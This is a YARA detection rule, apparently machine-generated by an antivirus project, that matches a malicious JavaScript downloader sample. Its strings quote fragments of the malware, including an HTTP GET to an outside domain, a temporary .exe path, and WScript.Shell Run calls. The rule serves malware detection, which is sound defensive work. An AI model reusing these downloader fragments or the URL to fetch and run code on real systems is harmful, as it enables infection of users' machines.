rule sig_20160329_4f9e456857166f34ac18c9cb39c6f759 {
  meta:
    description = "datamaliciousorder - file 20160329_4f9e456857166f34ac18c9cb39c6f759.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bea3f88aa93225a1792a4cb2fb7a6200b763b01d72cf5b7a9bc68005ea58ac74"

  strings:
    $s1  = "SX[B](\"GET\", \"http://fittedcarmats.com/m4usa\", false);" fullword ascii
    $s2  = "function lI() {return PG[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"vZEGC4Asv.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Vh](YJ() * 11); if (SX[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function r(S, RN){dr = dr * 1; return S - RN;};" fullword ascii
    $s5  = "var PG = function GF() {return WScript[c](\"WScript.Shell\");}(), R = 11;" fullword ascii
    $s6  = "function P(){return \"\" + E;};" fullword ascii
    $s7  = "function lP() {return ((t0 == true) && (t0 == E0)) ? 1 : dr;};" fullword ascii
    $s8  = "function ZP(C){PG[\"Run\"](C, dr, dr);};" fullword ascii
    $s9  = "var K = new this[\"Date\"]();" fullword ascii
    $s10 = "function Pp(d) {var Ln = (1, 2, 3, 4, 5, d); return Ln;};" fullword ascii
    $s11 = "function YJ(){return 22;};" fullword ascii
    $s12 = "function t(){return c;};" fullword ascii
    $s13 = "return r(Z, k);" fullword ascii
    $s14 = " while (VR){" fullword ascii
    $s15 = "function W()" fullword ascii
    $s16 = "var E0 = false;" fullword ascii
    $s17 = "t0 = true; " fullword ascii
    $s18 = "var t0 = false;" fullword ascii
    $s19 = "E0 = true; " fullword ascii
    $s20 = "var jU = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}